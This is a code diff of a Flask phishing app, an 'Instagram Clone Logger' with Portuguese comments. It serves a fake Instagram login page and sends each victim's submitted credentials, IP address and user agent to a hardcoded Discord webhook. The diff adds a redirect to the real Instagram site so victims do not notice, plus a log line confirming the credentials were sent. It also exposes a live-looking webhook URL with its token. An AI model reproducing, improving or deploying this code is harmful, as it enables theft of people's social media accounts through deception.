@@ -1,9 +1,16 @@
-from flask import Flask, request, render_template
+from flask import Flask, request, render_template, redirect, send_from_directory
 import requests
+import os
 
-app = Flask(__name__, static_url_path='/static', static_folder='static', template_folder='templates')
+app = Flask(__name__, static_folder="static", template_folder="templates")
 
-WEBHOOK = "https://discord.com/api/webhooks/1356844204608721017/GB-N9jMt__CmHGiFaJUAOg_doQBZTNH0GjOoTwekMa_SBmIff-NKyk91FUDDQuhfCQE2"  # Substitua pelo seu
+# Webhook ativo do Discord
+WEBHOOK = "https://discord.com/api/webhooks/1356844204608721017/GB-N9jMt__CmHGiFaJUAOg_doQBZTNH0GjOoTwekMa_SBmIff-NKyk91FUDDQuhfCQE2"
+
+# Rota para servir imagens corretamente
+@app.route('/img/<path:filename>')
+def serve_img(filename):
+    return send_from_directory('img', filename)
 
 @app.route("/", methods=["GET", "POST"])
 def index():
@@ -13,6 +20,7 @@ def index():
         ip = request.remote_addr
         user_agent = request.headers.get("User-Agent")
 
+        # Enviar para webhook do Discord
         data = {
             "username": "Instagram Clone Logger",
             "embeds": [
@@ -31,12 +39,13 @@ def index():
 
         try:
             requests.post(WEBHOOK, json=data)
+            print("[+] Credenciais enviadas para Discord.")
         except Exception as e:
-            print("[!] Falha ao enviar para o webhook:", e)
+            print("[!] Erro ao enviar para o Discord:", e)
 
-        return "<h2>Login processado. Obrigado!</h2>"
+        return redirect("https://www.instagram.com")
 
     return render_template("index.html")
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=8080)
+    app.run(host="0.0.0.0", port=8080, debug=True)
